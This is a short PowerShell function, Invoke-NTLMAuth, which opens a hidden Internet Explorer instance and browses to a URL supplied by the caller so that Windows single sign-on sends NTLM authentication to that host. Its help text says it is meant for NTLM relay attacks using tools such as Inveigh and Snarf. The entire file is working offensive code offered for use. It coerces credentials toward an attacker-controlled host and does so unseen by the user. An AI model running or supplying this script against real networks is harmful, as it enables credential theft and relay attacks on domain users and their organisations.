function Invoke-NTLMAuth
{
  <#
  .SYNOPSIS
    Triggers Internet Explorer to send NTLM authentication to a specified URL.

    Function: Invoke-NTLMAuth
    Author: Arno0x0x, Twitter: @Arno0x0x

  .DESCRIPTION
    If Internet Explorer is configured to automatically authenticate against some URL (typically internal domain URL), the Windows SSO mechanism will have an NTLM authentication initiated with the host.
    This can typically be used in a ntlm-auth-relay attack with tools such as Inveigh, Snarf, etc.

  .EXAMPLE
    PS C:\> Invoke-NTLMAuth http://10.0.0.2/
  #>

  [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String] $URL = ""
  )

  try {
    #Create hidden IE Com Object
    $IEComObject = New-Object -com "InternetExplorer.Application"
    $IEComObject.visible = $False
    $IEComObject.navigate($URL)

    Start-Sleep -s 5

    $IEComObject.Quit()
  } catch {}
}